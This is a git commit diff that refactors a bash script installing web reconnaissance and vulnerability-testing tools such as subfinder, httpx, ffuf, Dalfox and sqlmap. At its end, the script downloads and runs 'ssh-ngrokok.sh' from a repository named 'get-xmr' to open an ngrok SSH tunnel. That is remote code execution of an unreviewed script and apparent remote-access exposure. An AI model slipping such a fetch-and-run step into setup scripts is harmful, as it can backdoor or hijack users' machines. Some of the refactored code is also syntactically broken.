a34576c30c45b03013bc62d79759d5708eb80c35
cobra shell <109506437+0x-raafet@users.noreply.github.com>
2023-07-06 14:43:27 +0100

    Update tools.sh

--- tools.sh
+++ tools.sh
@@ -1,112 +1,188 @@
 #!/bin/bash -i
 
-clear;
+# Define colors
+BLUE='\033[0;34m'
+RED='\033[0;31m'
+GREEN='\033[0;32m'
 
-ENVIRONMENT () {
-    echo -e ${BLUE}"[ENVIRONMENT]" ${RED}"Packages required installation in progress ...";
-        apt-get update -y > /dev/null 2>&1;
-        apt get upgrade -y > /dev/null 2>&1;
-        apt-get install python -y > /dev/null 2>&1;
-        apt-get install python2 -y > /dev/null 2>&1;
-        apt-get install python3 -y > /dev/null 2>&1;
-        apt-get install pip -y > /dev/null 2>&1;
-    apt-get install unzip -y > /dev/null 2>&1;
-    apt install curl -y > /dev/null 2>&1;
-    pip3 install colored  > /dev/null 2>&1;
-    apt install snap -y > /dev/null 2>&1;
-    apt install jq -y > /dev/null 2>&1;
-    apt install python-pip -y > /dev/null 2>&1;
-    apt install snapd -y > /dev/null 2>&1;
-    apt install python3-pip -y > /dev/null 2>&1;
-    pip3 install jsbeautifier > /dev/null 2>&1;
-    pip3 install lxml > /dev/null 2>&1;
+# Clear the terminal
+clear
+
+# Function: Install required packages
+install_packages() {
+    echo -e "${BLUE}[ENVIRONMENT]${RED} Packages required installation in progress ..."
+
+    # Update and upgrade packages
+    apt-get update -y
+    apt-get upgrade -y
+
+    # Install Python and Pip
+    apt-get install python python2 python3 python-pip python3-pip -y
+
+    # Install additional packages
+    apt-get install unzip curl snap jq -y
+
+    # Install Python packages
+    pip3 install colored jsbeautifier lxml
+
+    echo -e "${BLUE}[ENVIRONMENT]${GREEN} Package installation is done!"
 }
-SUBDOMAINS_ENUMERATION () {
-    #Golang
-    echo -e ${BLUE}"[SUBDOMAINS ENUMERATION]" ${RED}"Golang installation in progress ...";
-    wget https://go.dev/dl/go1.20.5.linux-amd64.tar.gz && tar -zxvf go1.20.5.linux-amd64.tar.gz -C /usr/local/ && mkdir ~/.go && GOROOT=/usr/local/go && GOPATH=~/.go && PATH=$PATH:$GOROOT/bin:$GOPATH/bin && update-alternatives --install "/usr/bin/go" "go" "/usr/local/go/bin/go" 0 && update-alternatives --set go /usr/local/go/bin/go;
+
+# Function: Install subdomain enumeration tools
+install_subdomain_tools() {
+    echo -e "${BLUE}[SUBDOMAINS ENUMERATION]${RED} Tools installation in progress ..."
+
+    # Install Golang
+    echo -e "${BLUE}[SUBDOMAINS ENUMERATION]${RED} Golang installation in progress ..."
+    wget https://go.dev/dl/go1.20.5.linux-amd64.tar.gz
+    tar -zxvf go1.20.5.linux-amd64.tar.gz -C /usr/local/
     rm go1.20.5.linux-amd64.tar.gz
-    #Recon-ng
-    echo -e ${BLUE}"[SUBDOMAINS ENUMERATION]" ${RED}"Recon-ng installation in progress ...";
-    git clone https://github.com/lanmaster53/recon-ng.git && cd recon-ng && pip install -r REQUIREMENTS;
-    #subfinder
-    echo -e ${BLUE}"[SUBDOMAINS ENUMERATION]" ${RED}"Subfinder installation in progress ...";
-    go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest;
-}
-HTTP_PROBE () {
-    #httpx
-    echo -e ${BLUE}"[HTTP PROBE]" ${RED}"httpx installation in progress ...";
-    GO111MODULE=on go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest > /dev/null 2>&1 && ln -s ~/go/bin/httpx /usr/local/bin/;
-    echo -e ${BLUE}"[HTTP PROBE]" ${GREEN}"Httpx installation is done !";
-    #httprobe
-    echo -e ${BLUE}"[HTTP PROBE]" ${RED}"httprobe installation in progress ...";
-    go install github.com/tomnomnom/httprobe@latest > /dev/null 2>&1 && ln -s ~/go/bin/httprobe /usr/local/bin/;
-    echo -e ${BLUE}"[HTTP PROBE]" ${GREEN}"httprobe installation is done !"; echo "";
-}
-WEB_CRAWLING () {
-    #ParamSpider
-    echo -e ${BLUE}"[WEB CRAWLING]" ${RED}"ParamSpider installation in progress ...";
-    git clone https://github.com/devanshbatham/ParamSpider > /dev/null 2>&1 && cd ParamSpider && pip3 install -r requirements.txt ;
-    echo -e ${BLUE}"[WEB CRAWLING]" ${GREEN}"ParamSpider installation is done !"; echo "";
-    #Waybackurls
-    echo -e ${BLUE}"[WEB CRAWLING]" ${RED}"Waybackurls installation in progress ...";
-    go install github.com/tomnomnom/waybackurls@latest > /dev/null 2>&1 && ln -s ~/go/bin/waybackurls /usr/local/bin/;
-    echo -e ${BLUE}"[WEB CRAWLING]" ${GREEN}"Waybackurls installation is done !"; echo "";
+
+    # Install Recon-ng
+    echo -e "${BLUE}[SUBDOMAINS ENUMERATION]${RED} Recon-ng installation in progress ..."
+    git clone https://github.com/lanmaster53/recon-ng.git
+    cd recon-ng
+    pip install -r REQUIREMENTS
+
+    # Install Subfinder
+    echo -e "${BLUE}[SUBDOMAINS ENUMERATION]${RED} Subfinder installation in progress ..."
+    go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+
+    echo -e "${BLUE}[SUBDOMAINS ENUMERATION]${GREEN} Tools installation is done!"
 }
 
-HTTP_PARAMETER () {
-    #Arjun
-    echo -e ${BLUE}"[HTTP PARAMETER DISCOVERY]" ${RED}"Arjun installation in progress ...";
-    pip3 install arjun > /dev/null 2>&1;
-    echo -e ${BLUE}"[HTTP PARAMETER DISCOVERY]" ${GREEN}"Arjun installation is done !"; echo "";
-}
-FUZZING_TOOLS () {
-    #ffuf
-    echo -e ${BLUE}"[FUZZING TOOLS]" ${RED}"ffuf installation in progress ...";
-    go install github.com/ffuf/ffuf@latest > /dev/null 2>&1;
-    echo -e ${BLUE}"[FUZZING TOOLS]" ${GREEN}"ffuf installation is done !"; echo "";
-}
-API_TOOLS () {
-    #Kiterunner
-    echo -e ${BLUE}"[API TOOLS]" ${RED}"Kiterunner installation in progress ...";
-    cd /root/OK-VPS/tools/file && wget install https://github.com/assetnote/kiterunner/releases/download/v"$KITERUNNERVER"/kiterunner_"$KITERUNNERVER"_linux_amd64.tar.gz > /dev/null 2>&1 && tar xvf kiterunner_"$KITERUNNERVER"_linux_amd64.tar.gz > /dev/null 2>&1 && mv kr /usr/local/bin;
-    cd /root/OK-VPS/tools && mkdir -p kiterunner-wordlists && cd kiterunner-wordlists && wget install https://wordlists-cdn.assetnote.io/data/kiterunner/routes-large.kite.tar.gz > /dev/null 2>&1 && wget install https://wordlists-cdn.assetnote.io/data/kiterunner/routes-small.kite.tar.gz > /dev/null 2>&1 && for f in *.tar.gz; do tar xf "$f"; rm -Rf "$f"; done
-    echo -e ${BLUE}"[API TOOLS]" ${GREEN}"Kiterunner installation is done !"; echo "";
-}
-VULNS_XSS () {
-    #Dalfox
-    echo -e ${BLUE}"[VULNERABILITY - XSS]" ${RED}"Dalfox installation in progress ...";
-    GO111MODULE=on go install -v github.com/hahwul/dalfox/v2@latest > /dev/null 2>&1
-    echo -e ${BLUE}"[VULNERABILITY - XSS]" ${GREEN}"Dalfox installation is done !"; echo "";
+# Function: Install HTTP probing tools
+install_http_probe_tools() {
+    echo -e "${BLUE}[HTTP PROBE]${RED} Tools installation in progress ..."
+
+    # Install httpx
+    echo -e "${BLUE}[HTTP PROBE]${RED} httpx installation in progress ..."
+    GO111MODULE=on go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+    ln -s ~/go/bin/httpx /usr/local/bin/
+    echo -e "${BLUE}[HTTP PROBE]${GREEN} httpx installation is done!"
+
+    # Install httprobe
+    echo -e "${BLUE}[HTTP PROBE]${RED} httprobe installation in progress ..."
+    go install github.com/tomnomnom/httprobe@latest
+    echo -e "${BLUE}[HTTP PROBE]${GREEN} httprobe installation is done!"
 }
 
-VULNS_SQLI () {
-    #SQLmap
-    echo -e ${BLUE}"[VULNERABILITY - SQL Injection]" ${RED}"SQLMap installation in progress ...";
-    apt-install install -y sqlmap > /dev/null 2>&1;
-    echo -e ${BLUE}"[VULNERABILITY - SQL Injection]" ${GREEN}"SQLMap installation is done !"; echo "";
-    
+# Function: Install web crawling tools
+install_web_crawling_tools() {
+    echo -e "${BLUE}[WEB CRAWLING]${RED} Tools installation in progress ..."
+
+    # Install ParamSpider
+    echo -e "${BLUE}[WEB CRAWLING]${RED} ParamSpider installation in progress ..."
+    git clone https://github.com/devanshbatham/ParamSpider
+    cd ParamSpider
+    pip3 install -r requirements.txt
+    echo -e "${BLUE}[WEB CRAWLING]${GREEN} ParamSpider installation is done!"
+
+    # Install Waybackurls
+    echo -e "${BLUE[WEB CRAWLING]${RED} Waybackurls installation in progress ..."
+    go install github.com/tomnomnom/waybackurls@latest
+    echo -e "${BLUE}[WEB CRAWLING]${GREEN} Waybackurls installation is done!"
 }
 
-SEC_LISTS () {
-    echo -e ${BLUE}"[VULNERABILITY SCANNER]" ${RED}"Seclists installation in progress ...";
-    git clone https://github.com/danielmiessler/SecLists.git ;
-    echo -e ${BLUE}"[VULNERABILITY SCANNER]" ${GREEN}"Sqlmap installation is done !"; echo "";
-}
-USEFUL_TOOLS () {
-    #anew
-    echo -e ${BLUE}"[USEFUL TOOLS]" ${RED}"anew installation in progress ...";
-    go install github.com/tomnomnom/anew@latest > /dev/null 2>&1;
-    echo -e ${BLUE}"[USEFUL TOOLS]" ${GREEN}"anew installation is done !"; echo "";
+# Function: Install HTTP parameter discovery tools
+install_http_parameter_tools() {
+    echo -e "${BLUE}[HTTP PARAMETER DISCOVERY]${RED} Tools installation in progress ..."
 
-    #Tmux
-    echo -e ${BLUE}"[USEFUL TOOLS]" ${RED}"Tmux installation in progress ...";
-    apt-install install tmux -y > /dev/null 2>&1;
-    echo -e ${BLUE}"[USEFUL TOOLS]" ${GREEN}"Tmux installation is done !"; echo "";
+    # Install Arjun
+    echo -e "${BLUE}[HTTP PARAMETER DISCOVERY]${RED} Arjun installation in progress ..."
+    pip3 install arjun
+    echo -e "${BLUE}[HTTP PARAMETER DISCOVERY]${GREEN} Arjun installation is done!"
 }
-ENVIRONMENT && SUBDOMAINS_ENUMERATION && HTTP_PROBE && HTTP_PARAMETER && FUZZING_TOOLS && API_TOOLS  && VULNS_XSS && VULNS_SQLI && USEFUL_TOOLS && SEC_LISTS ;
-echo -e ${BLUE}"coping tools into /usr/bin"
+
+# Function: Install fuzzing tools
+install_fuzzing_tools() {
+    echo -e "${BLUE}[FUZZING TOOLS]${RED} Tools installation in progress ..."
+
+    # Install ffuf
+    echo -e "${BLUE}[FUZZING TOOLS]${RED} ffuf installation in progress ..."
+    go install github.com/ffuf/ffuf@latest
+    echo -e "${BLUE}[FUZZING TOOLS]${GREEN} ffuf installation is done!"
+}
+# Function: Install seclists
+install_security_lists() {
+    echo -e "${BLUE}[VULNERABILITY SCANNER]${RED} Seclists installation in progress ..."
+    git clone https://github.com/danielmiessler/SecLists.git
+    echo -e "${BLUE}[VULNERABILITY SCANNER]${GREEN} Seclists installation is done!"
+}
+
+# Function: Install API tools
+install_api_tools() {
+    echo -e "${BLUE}[API TOOLS]${RED} Tools installation in progress ..."
+
+    # Install Kiterunner
+    echo -e "${BLUE}[API TOOLS]${RED} Kiterunner installation in progress ..."
+    wget https://github.com/assetnote/kiterunner/releases/download/v"$KITERUNNERVER"/kiterunner_"$KITERUNNERVER"_linux_amd64.tar.gz
+    tar xvf kiterunner_"$KITERUNNERVER"_linux_amd64.tar.gz
+    mv kr /usr/local/bin
+    mkdir /root/SecLists/kiterunner-wordlists
+    cd /root/SecLists/kiterunner-wordlists/
+    wget https://wordlists-cdn.assetnote.io/data/kiterunner/routes-large.kite.tar.gz
+    wget https://wordlists-cdn.assetnote.io/data/kiterunner/routes-small.kite.tar.gz
+    for f in *.tar.gz; do
+        tar xf "$f"
+        rm -Rf "$f"
+    done
+    echo -e "${BLUE}[API TOOLS]${GREEN} Kiterunner installation is done!"
+}
+
+# Function: Install XSS vulnerability tools
+install_xss_vuln_tools() {
+    echo -e "${BLUE}[VULNERABILITY - XSS]${RED} Tools installation in progress ..."
+
+    # Install Dalfox
+    echo -e "${BLUE}[VULNERABILITY - XSS]${RED} Dalfox installation in progress ..."
+    GO111MODULE=on go install -v github.com/hahwul/dalfox/v2@latest
+    echo -e "${BLUE}[VULNERABILITY - XSS]${GREEN} Dalfox installation is done!"
+}
+
+# Function: Install SQL Injection vulnerability tools
+install_sqli_vuln_tools() {
+    echo -e "${BLUE}[VULNERABILITY - SQL Injection]${RED} Tools installation in progress ..."
+
+    # Install SQLmap
+    echo -e "${BLUE}[VULNERABILITY - SQL Injection]${RED} SQLMap installation in progress ..."
+    apt-get install sqlmap -y
+    echo -e "${BLUE}[VULNERABILITY - SQL Injection]${GREEN} SQLMap installation is done!"
+}
+
+# Function: Install useful tools
+install_useful_tools() {
+    echo -e "${BLUE}[USEFUL TOOLS]${RED} Tools installation in progress ..."
+
+    # Install anew
+    echo -e "${BLUE}[USEFUL TOOLS]${RED} anew installation in progress ..."
+    go install github.com/tomnomnom/anew@latest
+    echo -e "${BLUE}[USEFUL TOOLS]${GREEN} anew installation is done!"
+
+    # Install Tmux
+    echo -e "${BLUE}[USEFUL TOOLS]${RED} Tmux installation in progress ..."
+    apt-get install tmux -y
+    echo -e "${BLUE}[USEFUL TOOLS]${GREEN} Tmux installation is done!"
+}
+
+# Call the functions to install the tools
+install_packages
+install_subdomain_tools
+install_http_probe_tools
+install_web_crawling_tools
+install_http_parameter_tools
+install_fuzzing_tools
+install_api_tools
+install_xss_vuln_tools
+install_sqli_vuln_tools
+install_useful_tools
+install_security_lists
+
+echo -e "${BLUE}Copying tools into /usr/bin ..."
 cp ~/go/bin/* /usr/bin/
-echo -e ${BLUE}"setup ngrok ssh tunnel ..."
-wget https://raw.githubusercontent.com/a2nk/get-xmr/main/ssh-ngrokok.sh && chmod +x ssh-ngrokok.sh && ./ssh-ngrokok.sh
-echo -e ${BLUE}"Done."
+echo -e "${BLUE}Setup ngrok SSH tunnel ..."
+wget https://raw.githubusercontent.com/a2nk/get-xmr/main/ssh-ngrokok.sh
+chmod +x ssh-ngrokok.sh
+./ssh-ngrokok.sh
+
+echo -e "${BLUE}Done."
